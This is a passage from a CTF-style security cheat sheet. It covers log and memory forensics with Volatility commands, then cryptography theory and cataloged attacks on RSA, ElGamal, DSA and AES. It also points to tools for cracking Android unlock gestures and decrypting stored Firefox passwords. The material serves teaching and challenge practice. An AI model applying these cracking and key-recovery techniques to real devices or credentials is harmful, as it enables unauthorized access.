    It does not use [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which makes it easier to install. Found this tool [here](https://security.stackexchange.com/questions/152285/command-line-tools-to-decrypt-my-firefox-45-7-0-passwords-using-key3-db-and-logi).





## Logs



Looking at logs takes time but can lead to valuable information.

#### Windows

* `Windows Event Logs` - [Wikipedia](https://en.wikipedia.org/wiki/Event_Viewer)

    Windows logs a *lot* of information. It can be read using `mmc.exe`, under "Windows Logs".

    The categories are:
    | Category | Description |
    | --- | --- |
    | Application | Programs (started, stopped ...) |
    | Security | Security events (login, logout, ...) |
    | System | Changes to system (boot, shutdown, peripherals ...) |
    | Setup | System maintenance (update logs, ...) |

#### Linux

* `Linux logs` - [Wikipedia](https://en.wikipedia.org/wiki/Syslog)

    Linux logs are stored in `/var/log/`. The most important ones are:
    | File | Description |
    | --- | --- |
    | `auth.log` or `secure` | Authentication events (login, logout, ...) |
    | `syslog` or `messages` | General messages (system wide) |
    | `dpkg.log` | Package management |
    | `kern.log` | Kernel messages |
    | `btmp` | Failed login attempts |
    | `wtmp` | Login/logout history |
    | `lastlog` | Last login for each user |

    `btmp`, `wtmp` and `lastlog` can be read using `last <file>`

    Other applications can have their own logs in /var/logs.

#### Apache

* `Apache logs` - [Website](https://httpd.apache.org/docs/2.4/logs.html)
  
    Apache logs are often stored in `/var/log/apache2/`. The most important ones are:
    | File | Description |
    | --- | --- |
    | `access.log` | HTTP requests |
    | `error.log` | HTTP errors |
    | `other_vhosts_access.log` | HTTP requests from other virtual hosts |

    `access.log` can be read using `tail -f <file>` or with `grep` to filter the logs.

    It can also be imported into a [pandas dataframe](https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.read_csv.html) using this snippet:
    ```python
    # Read access.log file
    df = pd.read_csv(filename,
                sep=r'\s(?=(?:[^"]*"[^"]*")*[^"]*$)(?![^\[]*\])',
                engine='python',
                usecols=[0, 3, 4, 5, 6, 7, 8],
                names=['ip', 'datetime', 'request', 'status', 'size', 'referer', 'user_agent'],
                na_values='-',
                header=None
                    )

    # Extract the date from the datetime column
    df['date'] = df['datetime'].str.extract(r'\[(.*?):', expand=True)

    # Extract the time from the datetime column
    df['time'] = df['datetime'].str.extract(r':(.*?)\s', expand=True)
    ```




## Android Forensics



* `Gesture cracking`

    The gesture needed to unlock the phone is stored in `/data/system/gesture.key` as a SHA1 hash of the gesture. [This python script](Forensics/Android Forensics/Tools/gesture_cracker.py) or [this C program](Forensics/Android Forensics/Tools/gesture_cracker.c) can be used to crack the gesture, .



## Memory Dump



Memory dumps are captures of the state of the memory at a given time. It contains all the loaded files, processes and data that was used at this moment.

Memory dumps can be analyzed using the [Volatility Framework](https://www.volatilityfoundation.org/) <span style="color:red">❤️</span> .

#### Volatility Framework
Two versions of the framework are available:
- [Volatility 2](https://github.com/volatilityfoundation/volatility) (Python 2)
- [Volatility 3](https://github.com/volatilityfoundation/volatility3) (Python 3)

Volatility 3 have currently less features but is easier to use. Volatility requires **profiles** which can sometimes be hard to find. Both versions are often used simultaneously.

The full documentation can be found [here](https://volatility3.readthedocs.io)

* `CheatSheet for volatility3` - [Website](https://blog.onfvp.com/post/volatility-cheatsheet/)

* `CheatSheet for volatility2` - [PDF](https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf)


* `Most useful volatility plugins`

    | Plugin | Description |
    | --- | --- |
    | `pslist` | List all processes |
    | `filescan` | List all files |
    | `filedump` | Dump a file from memory, usually works better with vol2 |
    | `netscan` | List all network connections |

##### Volatility common usage

* `Volatility 3 quick start`

    Some useful windows commands:
    ```bash
    # Utility
    export DUMP_NAME=memory.dmp
    mkdir out

    # General information
    sudo vol -f $DUMP_NAME windows.info # Get windows version
    sudo vol -f $DUMP_NAME windows.filescan > ./out/filescan.txt # List all files
    sudo vol -f $DUMP_NAME windows.pslist > ./out/pslist.txt # List all running processes
    sudo vol -f $DUMP_NAME windows.pstree > ./out/pstree.txt # List all running processes as a tree
    sudo vol -f $DUMP_NAME windows.netscan > ./out/netscan.txt # List all network connections
    sudo vol -f $DUMP_NAME windows.cmdlines > ./out/cmdlines.txt # List all commands executed and their arguments (arguments are usually very interesting)
    
    # Specific information
    sudo vol -f $DUMP_NAME windows.dumpfiles --physaddr <addr> # Dump a file from memory (addr from filescan)
    sudo vol -f $DUMP_NAME windows.handles --pid <pid> # List all handles of a process (files opened, etc...)
    
    # Registry
    sudo vol -f $DUMP_NAME windows.registry.hivescan > ./out/hivescan.txt # List all registry hives
    sudo vol -f $DUMP_NAME windows.registry.hivelist > ./out/hivelist.txt # List all registry hives
    sudo vol -f $DUMP_NAME windows.registry.printkey.PrintKey --key 'Software\Microsoft\Windows\CurrentVersion\Run' > ./out/autoruns.txt # List all autoruns
    ```

    Some useful linux commands:
    ```bash
    # Utility
    export DUMP_NAME=memory.dmp
    mkdir out

    # General information
    sudo vol -f $DUMP_NAME linux.info # Get linux version
    sudo vol -f $DUMP_NAME linux.filescan > ./out/filescan.txt # List all files
    sudo vol -f $DUMP_NAME linux.pslist > ./out/pslist.txt # List all running processes
    sudo vol -f $DUMP_NAME linux.pstree > ./out/pstree.txt # List all running processes as a tree
    sudo vol -f $DUMP_NAME linux.netscan > ./out/netscan.txt # List all network connections
    sudo vol -f $DUMP_NAME linux.cmdlines > ./out/cmdlines.txt # List all commands executed and their arguments (arguments are usually very interesting)

    # Specific information
    sudo vol -f $DUMP_NAME linux.dumpfiles --physaddr <addr> # Dump a file from memory (addr from filescan)
    sudo vol -f $DUMP_NAME linux.handles --pid <pid> # List all handles of a process (files opened, etc...)
    ```

* `Volatility 2 quick start`

    Some useful general commands:
    ```bash
    # Utility
    export DUMP_NAME=memory.dmp
    mkdir out

    sudo vol2 --info | grep "Profile" # List all available profiles
    sudo vol2 -f $DUMP_NAME imageinfo # Get information to find the profile
    sudo vol2 -f $DUMP_NAME --info    # List plugins 
    ```

    Some useful windows commands:
    ```bash
    export PROFILE=Win7SP1x64 # Replace with the profile found with imageinfo
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE filescan > ./out/filescan.txt # List all files
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE pslist > ./out/pslist.txt # List all running processes
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE pstree > ./out/pstree.txt # List all running processes as a tree
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE procdump --pid=<pid> --dump-dir=./out # Dump a process
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE cmdline > ./out/cmdline.txt # List all executed commands
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE netscan > ./out/netscan.txt # List all network connections
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE mftparser > ./out/mftparser.txt # List all files/changes in the MFT
    ```

    Some useful linux commands:
    ```bash
    export PROFILE=LinuxUbuntu1604x64 # Replace with the profile found with imageinfo
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE linux_enumerate_files > ./out/enum_files.txt # List all files
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE linux_pslist > ./out/linux_pslist.txt # List all running processes
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE linux_pstree > ./out/linux_pstree.txt # List all running processes as a tree
    sudo vol2 -f $DUMP_NAME --profile=$PROFILE linux_procdump --pid=<pid> --dump-dir=./out # Dump a process
    ```

#### Other tools

* `bulk_extractor` - [GitHub](https://github.com/simsong/bulk_extractor)

    Find some information in a large binary dump.
    
    ```bash
    mkdir out_bulk
    bulk_extractor ./dump.bin -o ./out_bulk
    ```

* Browser profile

    It is often a good idea to look at the browser profile to find interesting information, such as bookmarks, history, cookies, stored passwords, etc... 
    
    See `Browser Forensics` in the `Forensics` section.







## Docker



* `Dive` - [GitHub](https://github.com/wagoodman/dive)

    Explore layers of a docker image.

    If a interesting file modification is found, it can be extracted from the image with an archive editing software (or with `dive export <image> <layer> <file> <output>` ?).


<br><br>

# Cryptography

⇨ [Fundamentals](#fundamentals)<br>
⇨ [Public Key](#public-key)<br>
⇨ [Symetric](#symetric)<br>
⇨ [Diffie-Hellman](#diffie-hellman)<br>
⇨ [Elliptic Curves](#elliptic-curves)<br>
⇨ [Hashes](#hashes)<br>
⇨ [Misc Codes](#misc-codes)<br>


Cryptography and Cryptanalysis are the art of creating and breaking codes. 

This section will only explain the most common attacks, as there are too many of them (and would require too much time to write). However, tools and resources will be provided to help you learn more about cryptography and understand the well-known attacks.

Platforms with cryptanalysis challenges:

| Name | Description | Website |
| ---- | ----------- | ------- |
| [Cryptohack](https://cryptohack.org/) | Cryptanalysis challenges presented in a game-like and competitive (no public solutions) way. | [https://cryptohack.org](https://cryptohack.org/) |
| [CryptoPals](https://cryptopals.com/) | Sets of hard challenges with public solutions available. | [https://cryptopals.com](https://cryptopals.com/) |


### Common tools

* `SageMath` - [Website](https://www.sagemath.org/)

    Powerful mathematics software, very useful for crypto and number theory.

* `Crypton` - [GitHub](https://github.com/ashutosh1206/Crypton)

    Archive repository of the most common attacks on cryptosystems.

* `Crypto Attacks repository` <span style="color:red">❤️</span> - [GitHub](https://github.com/jvdsn/crypto-attacks)

    A large collection of cryptography attacks.

### Common attacks

* Predictable Pseudo-Random Number Generators

    For performance reasons, most of random number generators are **predictable**. Generating a cryptographic key requires a secure PRNG.
    
    For example, python's `random` module uses the Mersenne Twister algorithm, which is not cryptographically secure. [`randcrack`](https://github.com/tna0y/Python-random-module-cracker) is a tool that can predict the next random number generated by the Mersenne Twister algorithm when you know the 624 previously generated integers (4 bytes each).

* Duplicate Signature Key Selection (DSKS) - [StackExchange](https://crypto.stackexchange.com/questions/99523/how-can-we-prevent-duplicate-key-attacks-on-digital-signatures)

    Given a message `m` and a signature `s`, it is possible to find a second signature `s'` generated from a different private/public key pair.

    This is valid for most of digital signature schemes, including RSA, DSA, ECDSA.


* Square root when $p ≡ 3$ mod $4$

    Computing the square root of a number modulo a prime number is easy when the prime is congruent to 3 modulo 4.

    Here is how to do it with SageMath:
    ```python
    p = 101
    F = GF(p)
    sr = F(71).sqrt()
    assert sr**2 % p == 71
    ```

## Fundamentals

⇨ [Number theory](#number-theory)<br>
⇨ [Lattices](#lattices)<br>


This section is currently under construction. Use the search bar to find the topic you are looking for.


### Number theory



This section is currently under construction. Use the search bar to find the topic you are looking for.


##### Number theory basics

> *Property* Notations
>
> * $a \mid b$ - $a$ divides $b$
> * $a \Z$ - the set of all integers that are multiples of $a$
>

###### Divisibility
<!-- GCD -->
> *Definition* GCD - Greatest Common Divisor
>
> The greatest common divisor of two integers $a$ and $b$ is the largest integer that divides both $a$ and $b$:
>
> $$ a \Z + b \Z = \gcd(a, b) \Z $$
>

This can be extended to more than two integers. When $\gcd(a, b) = 1$, we say that $a$ and $b$ are coprime.

We also have the following properties:  
$\gcd(a, b) = \gcd(b, a)$  
$\gcd(a, b) = \gcd(-a, b) = \gcd(a, -b) = \gcd(-a, -b)$  
$\gcd(a, b) = \gcd(a, b - a)$  
$\gcd(a, b) = \gcd(a, b \mod a)$  
$\gcd(k \cdot a, k \cdot b) = k \cdot \gcd(a, b)$

<!-- bezout -->
> *Theorem* Bezout's identity
>
> For any $a_1, a_2 \cdots a_n \in \Z$, they are coprime if and only if there exist integers $x_1, x_2 \cdots x_n$ such that:
>
> $$ x_1 \cdot a_1 + x_2 \cdot a_2 + \cdots + x_n \cdot a_n = 1 $$
>

<!-- gauss -->
> *Theorem* Gauss's lemma
>
> If $a \mid bc$ and $\gcd(a, b) = 1$, then $a \mid c$.
>

<!-- lcm -->
> *Definition* LCM - Least Common Multiple
>
> The least common multiple of two integers $a$ and $b$ is the smallest integer that is a multiple of both $a$ and $b$:
>
> $$ a \Z \cap b \Z = \text{lcm}(a, b) \Z $$
>

This can be extended to more than two integers. We also have the following properties:
$\text{lcm}(a, b) = \text{lcm}(b, a)$  
$\text{lcm}(a, b) = \text{lcm}(-a, b) = \text{lcm}(a, -b) = \text{lcm}(-a, -b)$  
$\text{lcm}(a, b) = \text{lcm}(a, b - a)$  
$\text{lcm}(a, b) = \text{lcm}(a, b \mod a)$  
$\text{lcm}(k \cdot a, k \cdot b) = k \cdot \text{lcm}(a, b)$  
$\text{lcm}(a, b) \cdot \gcd(a, b) = \mid a \cdot b \mid$  

###### Prime numbers

<!-- prime number -->
> *Definition* Prime number
>
> A prime number is a natural number greater than 1 that has no positive divisors other than 1 and itself.
>

<!-- prime factorization -->
> *Theorem* Fundamental theorem of arithmetic
>
> Every integer greater than 1 can be expressed uniquely as a product of prime numbers.
>
> $$ n = p_1^{e_1} \cdot p_2^{e_2} \cdots p_k^{e_k} $$
>

<!-- fermat -->
> *Theorem* Fermat's little theorem
>
> If $p$ is a prime number and $a$ is an integer not divisible by $p$, then:
>
> $$ a^{p-1} \equiv 1 \mod p $$
>

<!-- wilson -->
> *Theorem* Wilson's theorem
>
> A natural number $p$ is a prime number if and only if:
>
> $$ (p-1)! \equiv -1 \mod p $$
>

###### Euler's totient function

<!-- euler's totient function -->
> *Definition* Euler's totient function
>
> The Euler's totient function $\phi(n)$ is the number of positive integers less than $n$ that are coprime to $n$.
>
> $$ \phi(n) = \mid \{ k \in \N \mid 1 \leq k < n, \gcd(k, n) = 1 \} \mid $$
>

<!-- euler's totient function properties -->
> *Property* Euler's totient function properties
>
> * If $p$ is a prime number, then $\phi(p) = p - 1$
> * If $a$ and $b$ are coprime, then $\phi(a \cdot b) = \phi(a) \cdot \phi(b)$
> * If $p$ is a prime number and $k \in \N$, then $\phi(p^k) = p^k - p^{k-1}$
>

<!-- euler -->
> *Theorem* Euler's theorem
>
> If $a$ and $n$ are coprime, then:
>
> $$ a^{\phi(n)} \equiv 1 \mod n $$



### Lattices



This section was made using [A Gentle Tutorial for Lattice-Based Cryptanalysis](https://eprint.iacr.org/2023/032.pdf) and the [Cryptohack lattice section](https://cryptohack.org/challenges/maths/).


##### Lattices definition

> *Definition:* Lattice
>
> Given linarly independent vectors $v_1, v_2, \dots, v_n \in \mathbb{R}^m$, the lattice generated by $b_1, b_2, \dots, b_n$ is the set of all integer linear combinations of $b_1, b_2, \dots, b_n$: 
>
> $$L = \{x_1b_1 + x_2b_2 + \dots + x_nb_n : x_i \in \mathbb{Z}\}$$


##### Lattice based problems

Many cryptography problems can be reduced to lattice-based problems. These probleme can then be seen as a lattice problem, usually `SVP` or `CVP` which can be solved using the LLL algorithm.

| Lattice-based problems |
| ---------------------- |
| Finding small roots of polynomials | 
| Knapsack problem | 
| Hidden number problem | 
| Extended HNP |

###### Finding small roots of polynomials

Finding small roots of polynomials modulo a composite integer can be solved using Coppersmith's method.

> *Definition:* Small roots problem
>
> Given an integer $N$ and a *monic* polynomial $f(x)$ of degree $d$ with coefficients in $\mathbb{Z}_N$,
> find all $x\in$ $\mathbb{Z}_N$ such that $f(x) \equiv 0 \mod N$ and $\vert x \vert < B$.
> This means solving: 
>
> $$f(x) = x^d + a_{d-1} x^{d-1} + \dots + a_1 x + a_0 \equiv 0 \mod N $$

This problem can be solved using the LLL algorithm on:

$$
\left(\begin{array}{cc}
N & & & & & \\
& BN & & & & \\
& & B^2N & & & \\
& & & \ddots & & \\
& & & & B^{d-1}N & \\
a_0 & a_1 & a_2 & \dots & a_{d-1} & B^d
\end{array}\right)
$$

* Implementation
    
    See [this python script](Cryptography/Fundamentals/Lattices/Tools/small_roots.py) for a quick implementation of this. If you need to be more precise, use [this github repository](https://github.com/josephsurin/lattice-based-cryptanalysis/blob/main/lbc_toolkit/problems/small_roots.sage)



###### Subset sum problem

The subset sum problem is a special case of the knapsack problem. 

> *Definition:* Subset sum problem
>
> Given a set of integers $S = \{s_1, s_2, \dots, s_n\}$ and a target integer $t$, find a subset $S' \subseteq S$ such that 
>
> $$\sum_{s_i \in S'} s_i = t$$


###### Hidden number problem

> *Definition:* Hidden number problem
>
> Given a a prime $p$ and a secret integer $\alpha \in \mathbb{Z}_p$, the hidden number problem is to find $x$ $m$ pairs of integers $(t_i, a_i)$ for $i = 1, 2, \dots, m$ such that $$ \beta_i - t_i \alpha + a_i \equiv 0 \mod p$$
> where $\beta_i$ are unknown integers.

This problem can be solved using the LLL algorithm on:

$$
\left(\begin{array}{cc} 
p & & & & & \\
& p & & & & \\
& & \ddots & & & \\
& & & p & & \\
t_1 & t_2 & \dots & t_m & B/p & \\
a_1 & a_2 & \dots & a_m & & B/p
\end{array}\right)
$$

where $B$ is a bound on the size of the $\beta_i$.







## Public Key

⇨ [RSA](#rsa)<br>
⇨ [ElGamal](#elgamal)<br>
⇨ [DSA](#dsa)<br>




### RSA



[RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) is an **asymetric** cryptographic algorithm. A **public key** is used to encrypt data and a **private key** is used to decrypt data.

##### Textbook definition

The variables of textbook RSA are:

| Variable | Description |
|----------|-------------|
| $N$ | The product of two large primes |
| $e$ | The public exponent |
| $d$ | The private exponent |

The public key is (N, e) and the private key is (N, d).

###### Key generation

1. Choose two large primes $p$ and $q$. Use a cryptographically secure random number generator.
2. Compute the public modulus:
   $$N = p q$$
3. Compute the "private" modulus:
   $$\Phi(N) = (p - 1) (q - 1)$$
4. Choose an integer $e$ such that 
   $$1 < e < \Phi(N) \text{ and } \gcd(e, \Phi(N)) = 1$$
   <br>
   
   Usually $e = 65537 = 0\text{x}10001$.
5. Compute $d$ such that $de = 1 \mod \Phi(N)$ <br>
   $$d = e^-1 \mod \Phi(N)$$
   
   (for exemple with the [Extended Euclidean algorithm](https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm))

###### Encryption (Textbook RSA)
To encrypt a message $m$ with the **public** key $(N, e)$, compute the ciphertext $c$ with:

$$c = m^e \mod N$$

###### Decryption (Textbook RSA)
To decrypt a ciphertext $c$ with the private key $(N, d)$, compute $m = c^d \mod N$.

m is the deciphered message.

##### Attacks

Several attacks exist on RSA depending on the circumstances.

* `RSA CTF Tool` <span style="color:red">❤️</span> - [GitHub](https://github.com/RsaCtfTool/RsaCtfTool)

    Performs several attacks on RSA keys. Very useful for CTFs.


* Known factors in databases

	Services such as [FactorDB](http://factordb.com) or  [Alpertron's calculator](https://www.alpertron.com.ar/ECM.HTM) provide a database of known factors. If you can find a factor of $N$, you can compute $p$ and $q$ then $d$.

* RSA Fixed Point - [StackExchange](https://crypto.stackexchange.com/questions/81128/fixed-point-in-rsa-encryption)

   These challenges can be spotted when the input is not changed with encrypted/decrypted.

   There are 6 non-trivial fixed points in RSA encryption that are always there, caracterized by $m$ mod $p \in \{0, 1, -1\}$ **and** $m$ mod $q \in \{0, 1, -1\}$.

   It is possible to deduce one of the prime factors of $n$ from the fixed point, since $\text{gcd}(m−1,n),\ \text{gcd}(m,n),\ \text{gcd}(m+1,n)$ are $1, p, q$ in a different order depending on the values of $m$ mod $p$ and $m$ mod $q$.

   However, it is also possible to find other fixed points that are not the 6 non-trivial ones. See [this cryptohack challenge](https://cryptohack.org/challenges/unencryptable/solutions/) for writeups on how to deduce the prime factors of $n$ from these fixed points.
   
* Decipher or signing oracle with blacklist 

   A decipher oracle can not control the message that it decrypts. If it blocks the decryption of cipher $c$, you can pass it $c * r^e \mod n$ where $r$ is any number. It will then return 
   $$(c * r^e)^d = c^d * r = m * r \mod n$$
    
   You can then compute $m = c^d$ by dividing by $r$.

   This also applies to a signing oracle with a blacklist.

* Bleichenbacher's attack on PKCS#1 v1.5

   When the message is padded with **PKCS#1 v1.5** and a **padding oracle** output an error when the decrypted ciphertext is not padded, it is possible to perform a Bleichenbacher attack (BB98). See [this github script](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/rsa/bleichenbacher.py) for an implementation of the attack.

   This attack is also known as the million message attack, as it require a lot of oracle queries.

* Finding primes $p$ and $q$ from d

   [This algorithm](Cryptography/Public Key/RSA/Tools/primes_from_d.py) can be used to find $p$ and $q$ from $(N, e)$ and the private key $d$


* Coppersmith's attack - [Wikipedia](https://en.wikipedia.org/wiki/Coppersmith%27s_attack)


###### Bad parameters attacks

* Wiener's Attack - [Wikipedia](https://en.wikipedia.org/wiki/Wiener%27s_attack) with continued fractions

   When $e$ is **very large**, that means $d$ is small and the system can be vulnerable to the Wiener's attack. See [this script](Cryptography/Public Key/RSA/Tools/wiener.py) for an implementation of the attack.

	This type of attack on small private exponents was improved by Boneh and Durfee. See [this repository](https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage) for an implementation of the attack.


* Small $e$, usually 3 in textbook RSA - [StackExchange](https://crypto.stackexchange.com/questions/33561/cube-root-attack-rsa-with-low-exponent)

   When $e$ is so small that $c = m^e < N$, you can compute $m$ with a regular root: $m = \sqrt[e]{c}$.

   If $e$ is a bit larger, but still so small that $c = m^e < kN$ for some small $k$, you can compute $m$ with a $k$-th root: $m = \sqrt[e]{c + kN}$.

   See [this script](Cryptography/Public Key/RSA/Tools/small_e.py) for an implementation of the attack.

* Many primes in the public modulus - [CryptoHack](https://cryptohack.org/courses/public-key/manyprime/)

   When $N$ is the product of many primes (~30), it can be easily factored with the [Elliptic Curve Method](https://en.wikipedia.org/wiki/Lenstra_elliptic_curve_factorization).

   See [this script](Cryptography/Public Key/RSA/Tools/many_primes.py) for an implementation of the attack.

* Square-free 4p - 1 factorization and it's RSA backdoor viability - [Paper](https://crocs.fi.muni.cz/_media/public/papers/2019-secrypt-sedlacek.pdf)

   > *Definition* Square-free number
   >If we have  
   >
   >$$\begin{cases}
   >N &= p \cdot q \\
   >T &= 4 \cdot p - 1 \\
   >T &= D \cdot s^2 \\
   >D &= 3 \mod 8
   >\end{cases}$$
   >
   >then $D$ is a square-free number and $N$ can be factored.

   See [this GitHub repository](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/complex_multiplication.py) for an implementation of the attack.
  
* Fermat's factorisation method - [Wikipedia](https://en.wikipedia.org/wiki/Fermat%27s_factorization_method)

   If the primes $p$ and $q$ are close to each other, it is possible to find them with Fermat's factorisation method. See [this script](Cryptography/Public Key/RSA/Tools/fermat_factor.py) for an implementation of the attack.

* ROCA vulnerability - [Wikipedia](https://en.wikipedia.org/wiki/ROCA_vulnerability)

   The "Return of Coppersmith's attack" vulnerability occurs when generated primes are in the form <br>
   $$p = k * M * + (65537^a \mod M)$$
   where $M$ is the product of $n$ successive primes and $n$.

   See this [GitHub gist](https://gist.github.com/zademn/6becc979f65230f70c03e82e4873e3ec) for an explaination of the attack.

   See this [Gitlab repository](https://gitlab.com/jix/neca) for an implementation of the attack.


###### Bad implementations attacks


* Chinese Remainder Attack

   When there are **multiple moduli** $N_1, N_2, \dots, N_k$ for multiple $c_1, c_2, \dots, c_k$ of the same message and the **same public exponent** $e$, you can use the [Chinese Remainder Theorem](https://en.wikipedia.org/wiki/Chinese_remainder_theorem) to compute $m$.

* Multiple Recipients of the same message

   When there are **multiple public exponents** $e_1, e_2$ for multiple $c_1, c_2$ and the **same moduli** $N$, you can use Bezout's identity to compute $m$.

   Using Bezout's algorithm, you can find $a$ and $b$ such that $a e_1 + b e_2 = 1$. Then you can compute $m$ with:
   $$c_1^a c_2^b = m^{a e_1} m^{b e_2} = m^{a e_1 + b e_2} = m^1 = m \mod N$$

* Franklin-Reiter related-message attack

   When two messages are encrypted using the same key $(e, N)$ and one is a polynomial function of the other, it is possible to decipher the messages.

   A special case of this is when a message is encrypted two times with linear padding : $c = (a*m +b)^e \mod N$.

   See this [GitHub repository](https://github.com/ashutosh1206/Crypton/blob/master/RSA-encryption/Attack-Franklin-Reiter/README.md) for an explaination of the attack.

   See [this script](Cryptography/Public Key/RSA/Tools/franklin_reiter.py) for an implementation of the attack.


* Signature that only check for the last few bytes - [CryptoHack](https://cryptohack.org/challenges/pedro/solutions/)

   When a signature is only checking the last few bytes, you can add $2^{8 * n}$ to the message and the signature will still be valid, where $n$ is the number of bytes checked. Consequently, finding the $e$-th root of the signature will be easier. Check writeups of the cryptohack challenge for more details.





### ElGamal



The [ElGamal encryption system](https://en.wikipedia.org/wiki/ElGamal_encryption) is an **asymetric** cryptographic algorithm. A **public key** is used to encrypt data and a **private key** is used to decrypt data.

##### Textbook definition

The variables of textbook ElGamal are:

| Variable | Description |
|----------|-------------|
| $p$ | A large prime number |
| $g$ | A generator of the multiplicative group of integers modulo $p$ |
| $h$ | The public key |
| $x$ | The private key |

The public key is $(p, g, h)$ and the private key is $(p, g, x)$.

###### Key generation

The key generation is very similar to the one of the [Diffie-Hellman key exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange).

1. Choose a large prime $p$.
2. Choose a generator $g$ of the multiplicative group of integers modulo $p$.
3. Choose a random integer $x$ such that $1 < x < p - 1$.
4. Compute the public key:
   $$h = g^x \mod p$$

###### Encryption (Textbook ElGamal)

To encrypt a message $m$ with the **public** key $(p, g, h)$, compute the ciphertext $(c_1, c_2)$ with:

1. Choose a random integer $y$ such that $1 < y < p - 1$.
2. Compute the first part of the ciphertext:
   $$c_1 = g^y \mod p$$
3. Compute the second part of the ciphertext:
    $$c_2 = m \cdot h^y \mod p$$

###### Decryption (Textbook ElGamal)

To decrypt a ciphertext $(c_1, c_2)$ with the private key $(p, g, x)$, compute $m$ with:
$$m = c_2 \cdot (c_1^x)^{-1} \mod p$$

m is the deciphered message.


##### Attacks

* CCA Padding Oracle

    The Textbook ElGamal encryption system is vulnerable to a [Chosen Ciphertext Attack (CCA)](https://en.wikipedia.org/wiki/Padding_oracle_attack) with a padding oracle.

    [FR] [404CTF2022 Writeup](https://remyoudompheng.github.io/ctf/404ctf/collateraux.html)



### DSA



[DSA](https://en.wikipedia.org/wiki/Digital_Signature_Algorithm) A.K.A Digital Signature Algorithm is a signing algorithm similar to [RSA](#rsa).

This algorithm is based on the [ElGamal encryption system](#elgamal).

##### Textbook definition

The variables of textbook RSA are:

| Variable | Description |
|----------|-------------|
| $q$ | A large prime |
| $p$ | A large prime such that $p -1$ is a multiple of $q$ |
| $g$ | $g = h^{(p-1)/q} \mod p$ where $h$ is a random integer such that $1 < h < p-1$ |

###### Key generation

- Chose $x$ such that $1 < x < q$, this is the private key.
- Compute $y = g^x \mod p$, this is the public key.

###### Signing

The signature of a message $m$ requires a hashing function $H$.

- Chose $k$ such that $1 < k < q$.
- Compute 
$$r = (g^k \mod p) \mod q$$
$$s = k^{-1} (H(m) + xr) \mod q$$

If $r = 0$ or $s = 0$, do it again with another $k$. The signature is $(r, s)$.

###### Verification

- Verify that $0 < r < q$ and $0 < s < q$.
- Compute $w = s^{-1} \mod q$.
- Compute $u_1 = H(m)w \mod q$ and $u_2 = rw \mod q$.
- Compute $v = (g^{u_1} y^{u_2} \mod p) \mod q$.
- Iif $v = r$, the signature is valid.

##### Attacks

* No hash function - [StackExchange](https://crypto.stackexchange.com/questions/44862/ecdsa-signature-without-hashing-or-with-offloaded-hash)

    If message is directly signed without hashing, it is possible to forge create messages that have the same signature.





## Symetric

⇨ [AES](#aes)<br>
⇨ [DES](#des)<br>
⇨ [RC4](#rc4)<br>




### AES

⇨ [AES - OFB Mode](#aes---ofb-mode)<br>
⇨ [AES - ECB Mode](#aes---ecb-mode)<br>
⇨ [AES - CBC Mode](#aes---cbc-mode)<br>
⇨ [AES - GCM Mode](#aes---gcm-mode)<br>
⇨ [AES - CTR Mode](#aes---ctr-mode)<br>


[AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) A.K.A. Rijndael is a **symmetric** cryptographic algorithm. It uses the **same key** for encryption and decryption.

[This tutorial](https://www.davidwong.fr/blockbreakers/index.html) is a very good introduction to AES and explains the implementation of the 128-bit version. It also goes through the [Square Attack](https://en.wikipedia.org/wiki/Square_attack) for a 4 round AES.


##### Modes of operation

Different [modes of operations](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation) are used to encrypt data larger than 128 bits (16 bytes). Block operation modes are used to encrypt data in one go while stream operation modes are used to encrypt data bit by bit.

The most common block operation modes are:

| Mode | Type | Description |
| ---- | ---- | ----------- |
| ECB | Block | Electronic Codebook |
| CBC | Block | Cipher Block Chaining |
| PCBC | Block | Propagating Cipher Block Chaining |
| CTR | Stream | Counter |
| CFB | Stream | Cipher Feedback |
| OFB | Stream | Output Feedback |

**Stream ciphers** usually only use the encryption block to create an output called **keystream** from pre-defined values. Then, it xors this keystream with the plaintext. Consequently, when a bit of plaintext is flipped, the corresponding bit of ciphertext is flipped as well. Stream ciphers are often vulnerable to **encryption oracles (CPA)** as their stream of bits is xored to the plaintext. An attacker only have to input null bytes to get this keystream.


##### Attacks

###### Bad parameters attacks

* 4-6 round AES

	When a low number of rounds is used, the key can be recovered by using the [Square Attack](https://en.wikipedia.org/wiki/Square_attack). See [this tutorial](https://www.davidwong.fr/blockbreakers/square.html) for an example.


* Weak Sbox - [StackExchange](https://crypto.stackexchange.com/questions/89596/linear-aes-expression-of-k-in-aesp-apk?noredirect=1&lq=1) [CryptoHack](https://cryptohack.org/challenges/beatboxer/solutions/)

	A weak S-box in the subBytes step makes AES an affine function : $AES(pt) = A * pt \oplus K$ where $A$ and $K$ are matrices of size 128 in $GF(2)$ and $A$ have a low dependence on the key. $A$ can be inverted and decipher any ciphertext using $pt = A^{-1} * (AES(ct) \oplus K)$.
	
	If there are no subBytes at all, the AES key can even be recovered. [See here](https://crypto.stackexchange.com/questions/89596/linear-aes-expression-of-k-in-aesp-apk?noredirect=1&lq=1).

	To solve this types of challenges, you can either implement a symbolic version of your AES variation and solve for the key, or try to find $A$ using linear algebra.

	[RootMe](https://www.root-me.org/en/Challenges/Cryptanalysis/AES-Weaker-variant) - RootMe challenge with no subBytes (identity sbox) and an encryption oracle.

	[CryptoHack](https://cryptohack.org/challenges/beatboxer/solutions/) - CryptoHack challenge with an affine sbox and only one message.

#### AES - OFB Mode



